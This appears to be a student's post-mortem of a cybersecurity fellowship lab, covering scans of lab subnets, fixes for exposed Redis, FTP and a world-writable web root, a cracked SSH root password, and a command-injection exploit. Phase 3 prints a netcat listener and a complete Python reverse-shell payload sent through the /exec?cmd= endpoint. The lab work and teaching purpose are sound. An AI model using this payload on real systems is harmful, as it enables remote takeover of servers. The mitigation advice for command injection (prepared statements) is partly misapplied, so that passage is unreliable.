# Phase 1 Final Reckoning — TEPP Post-Mortem
**Operator:** Lorraine Mercado
**Date:** May 28, 2026
**Repository:** https://github.com/merc-lorraine/Phase-1.git
**TKH Innovation Fellowship 2026 | Phase 1 | Cybersecurity**

---

## Phase 0: Reconnaissance

### Triage Network — 172.100.0.0/24
Host discovery identified four active systems within the 172.100.0.0/24 subnet: 172.100.0.1, 172.100.0.11, 172.100.0.12, and 172.100.0.13. Host 172.100.0.1 exposed TCP ports 22 and 5000, with OpenSSH 9.6p1 running on port 22 and an unidentified service on port 5000. Host 172.100.0.11 was running Redis (TCP 6379) and was configured to accept connections on all interfaces, indicating an exposed in-memory database service. Host 172.100.0.12 exposed an FTP service (vsftpd 3.0.2) on port 21. Host 172.100.0.13 returned all TCP ports as closed; however, local inspection revealed that the web root directory /var/www/html had permissions set to 777 (drwxrwxrwx), allowing unrestricted read, write, and execute access. This misconfiguration represents a significant file system-level security weakness.

Identified misconfigurations include exposed administrative services, unrestricted Redis exposure, an active FTP service without noted access controls, and overly permissive directory permissions that allow full write access to a web root directory.

### Breach Network — 172.80.0.0/24
Host discovery identified a single active system: 172.80.0.10. This host exposed TCP port 22 running OpenSSH 10.2 (protocol 2.0). No additional services were detected during the initial scan, suggesting a minimal attack surface limited primarily to SSH access. The presence of only an SSH service indicated that authentication-based access would likely be required for further enumeration or compromise.

Observed conditions informed a Phase 2 approach focused on credential discovery and authentication-based attack paths against the SSH service.

### Exploitation Network — 172.60.0.0/24
Host discovery identified two active systems: 172.60.0.1 and 172.60.0.10. Host 172.60.0.1 exposed TCP ports 22 and 5000, with OpenSSH 9.6p1 running on port 22 and an unidentified service on port 5000. Host 172.60.0.10 exposed TCP port 80 running a Python-based HTTP service identified as BaseHTTPServer 0.6 on Python 3.10.12. Manual HTTP enumeration confirmed the presence of a custom web application titled “Capstone Web Server v1.0.” Further inspection revealed that the service was executing from python3 /app/server.py, indicating a custom Python application handling HTTP requests directly.

The identified vulnerability was a command injection flaw in the /exec?cmd= endpoint, where user input was passed directly into subprocess.Popen() with shell=True. This design allowed arbitrary operating system command execution through unsanitized HTTP parameters, creating a remote code execution vulnerability.

---

## Phase 1: Rapid Triage

### Server 1 — 172.100.0.11
**Vulnerability Identified:**
Redis was exposed to the network because the service was configured to listen on all interfaces (0.0.0.0:6379). This was confirmed by inspecting the running process with ps aux inside the container. 

**Remediation Commands:**
1. Enter container: docker exec -it <container_name> sh
2. Remediation command: redis-cli CONFIG SET bind 127.0.0.1
3. Verify: ps aux

**Before State:**
PID   USER     TIME  COMMAND
    1 redis     0:43 redis-server 0.0.0.0:6379 

**After State:**
PID   USER     TIME  COMMAND
    1 redis     0:44 redis-server 127.0.0.1:6379

**Analysis:**
Redis was configured to listen on all network interfaces, making the service accessible to remote systems on the network. Exposed Redis instances are frequently targeted by attackers because they often lack authentication and may contain sensitive application data. Restricting Redis to localhost or enabling protected mode reduces the attack surface and helps prevent unauthorized access to the database service.

### Server 2 — 172.100.0.12
**Vulnerability Identified:**
An FTP service (VSFTPD) was running and listening on port 21. This was confirmed through Nmap service detection and by inspecting running processes inside the container using ps aux. 

**Remediation Commands:**
1. Enter container: docker exec -it <container_name> sh
2. Remediation command: ps aux, kill 22
3. Verify: docker ps -a 

**Before State:**
Nmap:  Port 21/tcp, ftp, open, version ‘ vsftpd 3.0.2’

ps aux: 
USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root          22  0.0  0.0  53308   160 ?        S    03:57   0:00 /usr/sbin/vsftpd 

**After State:**
The VSFTPD process was terminated, causing the container to stop. Subsequent attempts to connect to the host failed, and Nmap no longer detected an FTP service. 

ab4de43cbbfe   fauria/vsftpd   "/usr/sbin/run-vsftp…"   8 hours ago   Exited (143) 4 minutes ago              broken_server_2

**Analysis:**
The FTP service was running unnecessarily on the system, exposing an additional network-accessible service to potential attackers. Legacy protocols such as FTP transmit credentials in clear text and are frequently targeted for brute-force attacks and unauthorized access attempts. Removing unnecessary services reduces the attack surface and aligns with the principle of minimizing exposed network services. 

### Server 3 — 172.100.0.13
**Vulnerability Identified:**
The /var/www/html directory was configured with world-writable permissions, allowing any local user or compromised process to modify web application files.

**Remediation Commands:**
1. Enter container: docker exec -it <container_name> sh
2. Remediation command: chmod 755 /var/www/html
3. Verify: ls -ld /var/www/html

**Before State:**
drwxrwxrwx 2 root root 4096 May 30 03:57 /var/www/html

**After State:**
drwxr-xr-x 2 root root 4096 May 30 03:57 /var/www/html

**Analysis:**
Such permissions violate the principle of least privilege and significantly increase the risk of website defacement, malicious code injection, and persistence mechanisms. Restricting write access to authorized administrators reduces the attack surface and helps preserve the integrity of hosted web content. 

---

## Phase 2: The Breach

**Cracked Credentials:**
- Username: root
- Password: admin123

**Forensic Evidence:**
- Exact Timestamp of Successful Login:  2026-05-30 13:36:49 UTC 
- Attacker IP Address:  172.80.0.1 

**Engineered iptables Rule:**
iptables -A INPUT -s 172.80.0.1 -j DROP

**SOC Analysis:**
Blocking a single IP address may stop one attacker, but it does not prevent attacks from other systems. A real SOC would combine firewall rules with monitoring, log analysis, intrusion detection, and strong authentication controls to provide more effective protection against unauthorized access. 

---

## Phase 3: Full Spectrum

**Listener Configuration:**
A Netcat listener was configured on port 4444 using nc -lvnp 4444 to receive incoming reverse shell connections from the target system. 

**Reverse Shell Payload:**
/exec?cmd=python3 -c 'import socket,subprocess,os; s=socket.socket(); s.connect((172.80.0.1,4444)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); subprocess.call(["/bin/sh"])'

**Command Injection Explanation:**
The web application is vulnerable to command injection because it accepts user-supplied input from the cmd parameter and passes it directly to the operating system for execution. Specifically, the application uses subprocess.Popen() with shell=True, which causes user input to be interpreted as operating system commands. As a result, an attacker can execute unauthorized commands on the server by supplying malicious input through the web application. 

A reverse shell payload was conceptually executed through the /exec?cmd= endpoint using a Python-based socket connection. The payload leveraged the command injection vulnerability to force the target system to initiate an outbound connection to an attacker-controlled listener, enabling remote command execution through redirected input/output streams.
**Forensic Evidence:**
- Process ID (PID): 1
- User-Agent: curl/8.5.0 

**Lockdown Command:**
iptables -A INPUT -s 172.80.0.1 -j DROP 

**Final Analytical Paragraph:**
Executing this attack demonstrated that a single insecure coding decision can create a severe security vulnerability. The command injection flaw allowed user input to reach the operating system without proper validation or sanitization, creating an opportunity for unauthorized command execution. While network controls such as firewall rules can help limit attacker activity, they do not address the underlying weakness in the application. The most effective defensive controls are secure coding practices such as parameterized queries, prepared statements, and strict input validation. Implementing these controls would have stopped the attack at the application layer entirely. This exercise highlights the importance of secure software development practices as a foundational layer of defense.

---

## References

Open Web Application Security Project. (2024). Command injection. https://owasp.org/www-community/attacks/Command_Injection

Open Web Application Security Project. (2024). SQL injection. https://owasp.org/www-community/attacks/SQL_Injection

Python Software Foundation. (2024). subprocess — Subprocess management. https://docs.python.org/3/library/subprocess.html

Python Software Foundation. (2024). http.server — HTTP servers. https://docs.python.org/3/library/http.server.html

Nmap Project. (2024). Nmap reference guide. https://nmap.org/book/man.html

GNU Project. (2024). iptables documentation. https://netfilter.org/documentation/

Hydra Project. (2024). THC-Hydra documentation. https://github.com/vanhauser-thc/thc-hydra

